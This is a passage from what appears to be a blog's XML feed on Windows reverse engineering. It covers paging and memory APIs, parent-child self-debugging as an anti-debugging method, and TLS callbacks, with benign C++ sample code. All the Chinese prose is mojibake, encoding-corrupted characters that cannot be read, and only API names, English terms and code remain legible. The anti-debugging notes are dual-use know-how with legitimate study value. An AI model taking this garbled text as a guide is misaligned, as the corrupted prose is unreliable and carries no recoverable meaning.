¸æ€æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><ul><li>é€‰æ‹©ä¸€ä¸ªé¡µè¡¨ä¸­æŸ¥è¯¢æ¬¡æ•°æœ€å°‘çš„é¡µä½œä¸ºç‰ºç‰²é¡µ</li><li>å¦‚æœå®ƒè¢«ä¿®æ”¹äº†ï¼Œé‚£ä¹ˆå†™å›ç£ç›˜</li><li>å°†è¿™æ¬¡æŸ¥è¯¢çš„ç‰©ç†é¡µå†™åˆ°ç‰ºç‰²é¡µå¯¹åº”çš„ç‰©ç†é¡µä¸­</li><li>åˆ·æ–°é¡µè¡¨ï¼Œç„¶åå¯ä»¥ç»§ç»­è®¿é—®</li></ul><hr><h3 id="å†…å­˜ç®¡ç†">å†…å­˜ç®¡ç†</h3><p>å®é™…ä¸Šï¼Œæ“ä½œç³»ç»Ÿå¹¶ä¸æ˜¯åªç»´æŠ¤ä¸€å¼ é¡µè¡¨ï¼Œè€Œæ˜¯å¯¹äºæ¯ä¸ªè¿›ç¨‹éƒ½ç»´æŠ¤ä¸€å¼ é¡µè¡¨ï¼Œæ¯ä¸ªçš„å¤§å°ä¹Ÿéƒ½æ˜¯4KBï¼Œä»è€Œå½¢æˆäº†æ¯ä¸ªè¿›ç¨‹çš„ç‹¬ç«‹è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚è¿™æ ·ï¼Œæ¯ä¸ªç¨‹åºçš„EPå¯ä»¥éƒ½æ˜¯0x400000ï¼Œè€Œä¸ç”¨æ‹…å¿ƒç›¸äº’å½±å“ã€‚</p><p><img src="https://s2.loli.net/2024/08/15/oDiGwUxSMshrFgl.png" alt="image-20240815201626132"></p><h3 id="å†…å­˜ä¿æŠ¤">å†…å­˜ä¿æŠ¤</h3><p>é¡µè¡¨ä¸­æœ‰è®¿é—®æƒé™çš„æ ‡å¿—ä½å¯ä»¥æ§åˆ¶å¯¹å¯¹åº”é¡µçš„è®¿é—®ï¼Œç»¼åˆæ®µå¯„å­˜å™¨ï¼Œå®ç°å¯¹æ®µé¡µæƒé™çš„åˆ’åˆ†ï¼Œæä¾›å®‰å…¨ç­‰çº§</p><hr><h3 id="åœ°å€ç¿»è¯‘">åœ°å€ç¿»è¯‘</h3><p>åœ¨è¿™é‡Œè¯´æ˜è™šæ‹Ÿåœ°å€è½¬ä¸ºç‰©ç†åœ°å€çš„æµç¨‹</p><p>ä»»ä½•è™šæ‹Ÿåœ°å€éƒ½ç”±ä¸¤éƒ¨åˆ†ç»„æˆ(ç‰©ç†åœ°å€ä¹Ÿæ˜¯)ï¼š</p><p>è™šæ‹Ÿé¡µå·å’Œé¡µåç§»ï¼Œé•¿åº¦åˆ†åˆ«ä¸ºn-p-1å’Œp-1</p><p>è½¬æ¢æ—¶ï¼Œåªè½¬æ¢è™šæ‹Ÿé¡µå·ï¼Œè½¬ä¸ºç‰©ç†åœ°å€å+é¡µåç§»å°±å¾—åˆ°çœŸå®çš„ç‰©ç†åœ°å€</p><p><img src="https://s2.loli.net/2024/08/15/MCLDWKaB5ghyHXV.png" alt="image-20240815202956150"></p><p>æ­£å¦‚ä¸Šé¢è®²çš„ï¼Œä¸ºäº†å‡å°‘æ—¶é—´æ¶ˆè€—ï¼ŒMMUä¸­æœ‰ä¸€ä¸ªç¿»è¯‘åå¤‡ç¼“å†²å™¨TLBï¼Œå®ƒæ˜¯ä¸€ä¸ªç‰©ç†è®¾å¤‡ï¼Œæ¯ä¸€è¡Œéƒ½æœ‰ä¸€ä¸ªç”±å•ä¸ªPTEç»„æˆçš„å—ï¼Œå®ƒå¯ä»¥ç›´æ¥è¢«cpuæŸ¥è¯¢</p><p><img src="https://s2.loli.net/2024/08/15/IkMBq6neoRvNSdj.png" alt="image-20240815203950975"></p><h3 id="å¤šçº§é¡µè¡¨">å¤šçº§é¡µè¡¨</h3><p>å¾ˆæ˜æ˜¾ï¼Œå¦‚æœæ˜¯32ä½ç³»ç»Ÿï¼Œç”±äºä¸€ä¸ªç¨‹åºå°±æœ‰ä¸€ä¸ª4MBçš„é¡µè¡¨ï¼ˆä¸€ä¸ªé¡µè¡¨é¡¹éœ€è¦4å­—èŠ‚ï¼Œæœ‰4GB/4KB=$2^{20}$é¡¹ï¼‰ï¼Œå¦‚æœå¼€äº†50ä¸ªè¿›ç¨‹ï¼Œå°±æœ‰200MBå¤§å°çš„ç©ºé—´ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸èƒ½å¿å—çš„ã€‚</p><p>äºæ˜¯ï¼Œä½¿ç”¨å¤šçº§é¡µè¡¨å¯ä»¥å®ç°å‹ç¼©å†…å­˜ã€‚é¦–å…ˆï¼šç¬¬ä¸€çº§é¡µè¡¨åœ¨å†…å­˜ä¸­ï¼Œæœ€å¸¸ç”¨çš„åœ¨TLBä¸­ï¼Œæ£€ç´¢åœ°å€æ—¶ï¼Œå…ˆæ£€ç´¢TLBï¼Œå¦‚æœæ²¡æœ‰ï¼Œå†æ£€ç´¢å†…å­˜ï¼Œç„¶åè½¬åˆ°äºŒçº§é¡µè¡¨ï¼Œè¢«ç§°ä¸ºç‰‡(chunk)ã€‚å†åœ¨ç‰‡ä¸­æŸ¥æ‰¾åŸºå€å†è½¬åˆ°è™šæ‹Ÿå†…å­˜ã€‚</p><p>å¦‚æœç¬¬ä¸€çº§é¡µè¡¨ä¸å­˜åœ¨å¯¹åº”PTEï¼Œç¬¬äºŒçº§é¡µè¡¨é¡µä¸ä¼šå­˜åœ¨ã€‚<br>ç¬¬äºŒçº§é¡µè¡¨ä¸ä¸€å®šåœ¨å†…å­˜ä¸­ï¼Œåªæœ‰æœ€å¸¸ç”¨çš„æ‰åœ¨ã€‚</p><p>è¿™æ ·å°±å‡è½»äº†å†…å­˜çš„è´Ÿæ‹…ã€‚</p><p>å®é™…ä¸Šï¼Œä½¿ç”¨çš„å±‚çº§è¿˜æ›´å¤š</p><hr><h2 id="Windowså†…å­˜ç®¡ç†å±‚çº§åŠAPI">Windowså†…å­˜ç®¡ç†å±‚çº§åŠAPI</h2><p><a href="https://www.labri.fr/perso/betrema/winnt/heapmm.html">Managing Heap Memory in Win32</a></p><ul><li>è™šæ‹Ÿå†…å­˜</li><li>å †</li><li>å†…å­˜æ˜ å°„æ–‡ä»¶</li></ul><p><img src="https://s2.loli.net/2024/12/21/8G5xhPnNspmfzWo.png" alt="winå†…å­˜ç®¡ç†å±‚çº§"></p><p>å¯ä»¥çœ‹å‡ºï¼Œå±‚çº§æ˜¯cè¿è¡Œæ—¶å‡½æ•°/æœ¬åœ°å…¨å±€å†…å­˜APIé«˜äºå †å†…å­˜APIé«˜äºè™šæ‹Ÿå†…å­˜APIé«˜äºå†…æ ¸ï¼Œå†…å­˜æ˜ å°„æ–‡ä»¶APIå’ŒVirtualMemoryAPIæ˜¯ä¸€å±‚çš„ã€‚</p><p>æ‰€ä»¥è¯´ï¼ŒCè¯­è¨€ä¸­ä½¿ç”¨çš„malloc/callocå’Œcppä¸­çš„newåº•å±‚è°ƒç”¨çš„éƒ½æ˜¯HeapAllocå‡½æ•°ï¼ŒHeapAllocå‡½æ•°åº•å±‚è°ƒç”¨çš„éƒ½æ˜¯VirtualAllocå‡½æ•°ï¼ŒVirtualAllocå‡½æ•°å’ŒMemoryMappedFileéƒ½è°ƒç”¨çš„æ˜¯å†…æ ¸çš„å‡½æ•°ã€‚</p><p>é‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨VirtualAllocå‡½æ•°å‘¢ï¼Œå› ä¸ºå®ƒæœ‰ç€é™åˆ¶ï¼Œæ¯æ¬¡å¿…é¡»åˆ†é…é¡µå¤§å°çš„å€æ•°çš„å†…å­˜ï¼Œå†…å­˜åœ°å€ä¹Ÿè¦å¯¹é½ç­‰æ»¡è¶³ç³»ç»Ÿåº•å±‚æ•ˆç‡çš„è¦æ±‚(VirtualAllocç”³è¯·çš„å†…å­˜å°±æ˜¯å®é™…ä¸Šçš„é¡µäº¤æ¢æ–‡ä»¶)ï¼Œåœ¨å†™ä¸Šå±‚ä»£ç çš„æ—¶å€™æˆ‘ä»¬å¾€å¾€ä¸æƒ³è€ƒè™‘è¿™ä¹ˆå¤šï¼Œå› æ­¤å°±å°è£…æˆé«˜å±‚å‡½æ•°äº†ã€‚</p><hr><p>å‚è€ƒï¼š</p><p>ä¹¦ç±ï¼šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ</p><p>ç½‘ç«™ï¼š</p><p><a href="https://www.bilibili.com/read/cv16655753/">ä¸€ç¯‡æ–‡å¸¦ä½ ææ‡‚ï¼Œè™šæ‹Ÿå†…å­˜ã€å†…å­˜åˆ†é¡µã€åˆ†æ®µã€æ®µé¡µå¼å†…å­˜ç®¡ç†ï¼ˆè¶…è¯¦ç»†ï¼‰</a></p><p><a href="https://www.bilibili.com/video/BV1AU411o7GY/">ä½ çœŸçš„ç†è§£è™šæ‹Ÿå†…å­˜å—</a></p><p><a href="https://blog.csdn.net/weixin_65286359/article/details/135577694">CPUå…¥é—¨æ‰«ç›²ç¯‡ä¹‹MMUå†…å­˜ç®¡ç†å•å…ƒ------ä¸‡å­—é•¿æ–‡å¸¦ä½ æå®šMMU&amp;TLB&amp;TWU</a></p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> Winæ ¸å¿ƒ </category>
          
          <category> Winå†…æ ¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…å­˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çˆ¶å­è¿›ç¨‹åè°ƒè¯•</title>
      <link href="/posts/3f67770.html"/>
      <url>/posts/3f67770.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>é¡¾åæ€ä¹‰ï¼Œå¦‚æœä¸€ä¸ªè¿›ç¨‹åˆ›å»ºå‡ºäº†å¦ä¸€ä¸ªè¿›ç¨‹</p><p>ç„¶åç”¨ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼ˆçˆ¶ï¼‰å»è°ƒè¯•ç¬¬äºŒä¸ªè¿›ç¨‹ï¼ˆå­ï¼‰</p><p>å­è¿›ç¨‹ç”±äºå·²ç»è¢«è°ƒè¯•ï¼Œæ‰€ä»¥ä¸èƒ½å†è¢«è°ƒè¯•å™¨é™„åŠ ï¼Œä»è€Œé˜²æ­¢äº†çœŸå®é€»è¾‘è¢«è°ƒè¯•</p><p>è¿™é‡Œå¼•ç”³å‡ºå‡ ä¸ªè®®é¢˜ï¼š</p><blockquote><p>å¦‚ä½•åˆ›å»ºå¦ä¸€ä¸ªè¿›ç¨‹ï¼ˆå­è¿›ç¨‹çš„æ¥æºï¼‰</p><ul><li>å¦ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº</li><li>å°±æ˜¯æœ¬èº«</li><li>ä¸€æ®µå†…å­˜ä¸­çš„ä»£ç </li></ul><p>ä»ä¸Šåˆåˆ†å‡ºå‡ ä¸ªé—®é¢˜</p><ul><li>åˆ›å»ºå¦ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºï¼ˆå·²ç»å­˜åœ¨çš„ï¼Œè¿˜æ˜¯åœ¨ä»£ç é‡Œé¢éœ€è¦dumpæˆ–è€…ä»ç½‘ä¸Šä¸‹è½½ï¼‰</li><li>æœ¬èº«ï¼ˆå¦‚ä½•åŒºåˆ†ä¸¤æ¬¡æ‰§è¡Œçš„é€»è¾‘æµï¼‰</li><li>ä¸€æ®µå†…å­˜ä¸­çš„ä»£ç ï¼ˆCreateProcesså¾ˆæ˜æ˜¾ä¸æ”¯æŒï¼Œé‚£è¦æ€ä¹ˆåŠï¼‰</li></ul></blockquote><p>ç¬¬äºŒï¼š</p><blockquote><p>å¦‚ä½•ç”¨çˆ¶è¿›ç¨‹è°ƒè¯•å­è¿›ç¨‹</p><p>åœ¨win APIä¸­æœ‰CreateProcessçš„ç¬¬6ä¸ªå‚æ•°å¯ä»¥é€‰æ‹©çˆ¶è¿›ç¨‹ä½œä¸ºè°ƒè¯•å™¨ã€‚</p><p>ç„¶åé€šè¿‡APIä¸­å…¶å®ƒå‡½æ•°æ¥æ¥å—è°ƒè¯•ä¿¡æ¯ä»¥åŠè¯»å–/ä¿®æ”¹å­è¿›ç¨‹çš„ä¸Šä¸‹æ–‡/å¯„å­˜å™¨/æ‰§è¡Œæµã€‚</p><p>æœ‰æ²¡æœ‰å…¶å®ƒåŠæ³•ä¸çŸ¥é“</p></blockquote><p>ç¬¬ä¸‰ï¼š</p><blockquote><p>æ‰§è¡Œå®Œå¦‚ä½•è¿”å›å†…å®¹/ç»“æœ</p><p>åŒæ ·åœ¨win APIä¸­æœ‰å‡½æ•°OutputDebugStringæ¥è¾“å‡ºè°ƒè¯•ä¿¡æ¯</p></blockquote><p>ç°åœ¨ä»¥åˆ›å»ºè‡ªèº«ä¸ºæ–°è¿›ç¨‹æ¥è§£é‡Š</p><hr><h2 id="åŒºåˆ†é€»è¾‘æµçš„æ–¹æ³•">åŒºåˆ†é€»è¾‘æµçš„æ–¹æ³•</h2><p>åŒºåˆ†é€»è¾‘æµï¼Œè¡¨æ˜ä¸ºéœ€è¦ä¸€ä¸ªif-elseåˆ†æ”¯è¯­å¥æ¥æ‰§è¡Œä¸åŒçš„ä»£ç </p><p>å› æ­¤</p><ul><li>ifä¸­å†™ä¸€æ ·çš„å†…å®¹ï¼Œä½†æ˜¯å¯èƒ½è¿”å›ä¸åŒçš„ä¸œè¥¿</li><li>åœ¨æ‰§è¡Œç¬¬ä¸€ä¸ªé€»è¾‘æ—¶ä¿®æ”¹äº†æœ¬èº«ï¼Œå¯¼è‡´æ‰§è¡Œæµçš„æ”¹å˜</li></ul><p>å¯¹äºç¬¬ä¸€ç§æƒ…å†µ</p><ul><li>æ£€æŸ¥è‡ªèº«çš„çŠ¶æ€ï¼Œä¸¤æ¬¡çš„çŠ¶æ€ä¸ä¸€è‡´</li><li>æ£€æŸ¥å¤–ç•Œçš„çŠ¶æ€ï¼Œé€šè¿‡æœ¬èº«åœ¨å¤–ç•Œçš„æ³¨å†Œå†…å®¹æ¥åˆ¤æ–­</li></ul><p>å¸¸è§æ ‡å¿—ä½<br>ç³»ç»Ÿå‡½æ•°</p><p>è¿™äº›å†…å®¹è¿˜æ²¡æ€ä¹ˆå­¦QAQ</p><p>æˆ‘åªçŸ¥é“ç»‘å®šç«¯å£å’Œåˆ›å»ºäº’æ–¥ä½“ä¸¤ä¸ªå‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°åªè¦æŒ‡å®šäº†idï¼Œåªè¦ç¬¬ä¸€æ¬¡è¿”å›å¯è¡Œï¼Œç¬¬äºŒæ¬¡ä¸€å®šå¤±è´¥ã€‚å€Ÿè¿™ä¸ªæ¥ç›´æ¥åŒºåˆ†é€»è¾‘æµï¼Œè‡³äºä½¿ç”¨å®ƒä»¬ï¼Œè‡ªç„¶ä¸é‡è¦</p><p>è¿˜æœ‰å°±æ˜¯åˆ›å»ºè¿›ç¨‹æ—¶å¯ä»¥æŒ‡å®šå‚æ•°ï¼Œå‚æ•°æ•°é‡ä¹Ÿå¯ä»¥ç®—ä½œä¸åŒçš„å†…å®¹</p><hr><h2 id="è°ƒè¯•æ–¹æ³•">è°ƒè¯•æ–¹æ³•</h2><p>é¦–å…ˆCreateProcessï¼Œå¹¶è®¾ç½®DEBUG_PROCESS</p><p>ç„¶åWaitForDebugEventç­‰å¾…å¹¶è¯»å–è°ƒè¯•ä¿¡æ¯</p><p>ç„¶åç”¨å¾—åˆ°çš„debugEvent.dwDebugEventCodeæ¥åˆ¤æ–­ç±»å‹</p><p>æ¯”å¦‚ï¼šEXCEPTION_DEBUG_EVENTï¼ˆint 3æ–­ç‚¹ï¼‰</p><p>ç„¶åå°±å¯ä»¥ç”¨WriteProcessMemoryå†™å…¥å†…å­˜ï¼Œå…¶å®ƒçš„åƒè·å–ripï¼Œstackä¹‹ç±»çš„å°±ä¸è¯´äº†</p><p>æœ€åContinueDebugEventç»§ç»­æ‰§è¡Œæµç¨‹</p><p>è¿™é‡Œåªæ˜¯å¤§æ¦‚è¯´ä¸ªæµç¨‹</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> æŠ€èƒ½ </category>
          
          <category> ååŠ¨æ€è°ƒè¯• </category>
          
          <category> åŒè¿›ç¨‹è°ƒè¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> åè°ƒè¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLSç›¸å…³ç ”ç©¶</title>
      <link href="/posts/95e9e72b.html"/>
      <url>/posts/95e9e72b.html</url>
      
        <content type="html"><![CDATA[<p>ç»å¸¸èƒ½çœ‹åˆ°æœ‰tlsçš„é¢˜ï¼Œè¿™é‡Œç ”ç©¶ä¸€ä¸‹tlsçš„åŸç†å’Œå†™æ³•</p><p>ç„¶åå°±å‘ç°ç½‘ä¸Šå·²ç»æœ‰å¾ˆå…¨çš„æ•™ç¨‹äº†ï¼Œé‚£æˆ‘å°±ç›´æ¥æ”¾æ•™ç¨‹äº†</p><p><a href="https://www.52pojie.cn/thread-1490663-1-1.html">ã€åŸåˆ›ã€‘åè°ƒè¯•å®æˆ˜ç³»åˆ—äºŒ TLSåè°ƒè¯•+CheckRemoteDebuggerPresentåŸç† - ã€è½¯ä»¶è°ƒè¯•åŒºã€ - å¾çˆ±ç ´è§£ - LCG - LSG |å®‰å“ç ´è§£|ç—…æ¯’åˆ†æ|www.52pojie.cn</a></p><h3 id="å†™æ³•">å†™æ³•</h3><p>è¿™ä¸ªè¯´çš„å¾ˆæ¸…æ¥šï¼Œè¦å†™TLSå‡½æ•°ï¼Œåªéœ€è¦ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åŒ…å«å›è°ƒ</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64       <span class="comment">//64ä½</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span>               <span class="comment">//32ä½</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>) </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//åˆ›å»ºæ®µ</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="comment">//æ˜¯cè¯­è¨€å°±ä¸å†™</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å‰ç¼€è¡¨ç¤ºè¿™æ˜¯çº¿ç¨‹çš„å…¨å±€å˜é‡ï¼Œæ¯ä¸ªçº¿ç¨‹åˆå§‹åŒ–çš„å€¼éƒ½æ˜¯0x1ï¼Œç”Ÿå‘½ä»…åœ¨è¿™ä¸ªçº¿ç¨‹å†…</span></span><br><span class="line">__declspec (thread) <span class="type">int</span> CheckIsChildren = <span class="number">0x1</span>;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//å‡½æ•°å®šä¹‰</span></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">t_TlsCallBack</span><span class="params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span></span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ·»åŠ å‡½æ•°åˆ°æ•°ç»„ï¼Œæ‰§è¡Œæ—¶æŒ‰æ•°ç»„å…ƒç´ ä¾æ¬¡æ‰§è¡Œ</span></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; t_TlsCallBack ,<span class="number">0</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ï¼š</p><h3 id="reason">reason</h3><p>Reasonå€¼å¯¹åº”4ç§è°ƒç”¨åŸå› ï¼Œåœ¨è¿™å››ä¸ªæ¡ä»¶ä¸‹ï¼Œéƒ½ä¼šè§¦å‘TLSå›è°ƒå‡½æ•°</p><table><thead><tr><th style="text-align:left">å®å®šä¹‰</th><th style="text-align:left">å€¼</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left">DLL_PROCESS_ATTACH</td><td style="text-align:left">1</td><td style="text-align:left">ä¸€ä¸ªæ–°è¿›ç¨‹å·²ç»å¯åŠ¨ï¼ŒåŒ…æ‹¬ç¬¬ä¸€ä¸ªçº¿ç¨‹</td></tr><tr><td style="text-align:left">DLL_THREAD_ATTACH</td><td style="text-align:left">2</td><td style="text-align:left">åˆ›å»ºäº†ä¸€ä¸ªæ–°çº¿ç¨‹ã€‚æ­¤é€šçŸ¥å·²å‘é€ç»™é™¤ç¬¬ä¸€ä¸ªçº¿ç¨‹å¤–çš„æ‰€æœ‰çº¿ç¨‹</td></tr><tr><td style="text-align:left">DLL_THREAD_DETACH</td><td style="text-align:left">3</td><td style="text-align:left">çº¿ç¨‹å³å°†è¢«ç»ˆæ­¢ã€‚æ­¤é€šçŸ¥å·²å‘é€ç»™é™¤ç¬¬ä¸€ä¸ªçº¿ç¨‹å¤–çš„æ‰€æœ‰çº¿ç¨‹</td></tr><tr><td style="text-align:left">DLL_PROCESS_DETACH</td><td style="text-align:left">0</td><td style="text-align:left">è¿›ç¨‹å³å°†ç»ˆæ­¢ï¼ŒåŒ…æ‹¬åŸå§‹çº¿ç¨‹</td></tr></tbody></table><p>æ‰€ä»¥å†…éƒ¨åº”å½“ä½¿ç”¨ifæ¥åˆ¤æ–­ï¼ˆæˆ–è€…æ²¡æœ‰åˆ›å»ºçº¿ç¨‹ï¼Œå°±ä¸ç®¡äº†ï¼‰</p><h3 id="æç¤º">æç¤º</h3><ul><li>åœ¨ä½¿ç”¨CreateThreadåè®°å¾—WaitForSingleObjecté˜²æ­¢ä¸»çº¿ç¨‹æå‰ç»“æŸ</li><li>tlså£°æ˜çš„å˜é‡æ˜¯åœ¨æ¯ä¸ªçº¿ç¨‹é‡Œé¢åˆ†ç¦»çš„ï¼Œäº’ä¸å½±å“ï¼Œç±»ä¼¼äºé™æ€å±€éƒ¨å˜é‡ï¼Ÿï¼Ÿ</li></ul><hr><p>ç›¸å…³ä»£ç </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åŒ…å«å›è°ƒ</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64       <span class="comment">//64ä½</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span>               <span class="comment">//32ä½</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>) </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//åˆ›å»ºæ®µ</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec (thread) <span class="type">int</span> CheckIsChildren = <span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* szMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hStdout = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);</span><br><span class="line"><span class="built_in">WriteConsoleA</span>(hStdout, szMsg, <span class="built_in">strlen</span>(szMsg), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">t_TlsCallBack</span><span class="params">(PVOID Dllhandle, DWORD Reason, PVOID Reserved)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">CheckIsChildren--;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;loaded\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">2</span>) &#123;</span><br><span class="line">CheckIsChildren += <span class="number">7</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;this is %d\n&quot;</span>, CheckIsChildren);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">3</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;exit thread %d\n&quot;</span>, CheckIsChildren);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Reason == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="type">char</span> szMsg[<span class="number">80</span>] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"><span 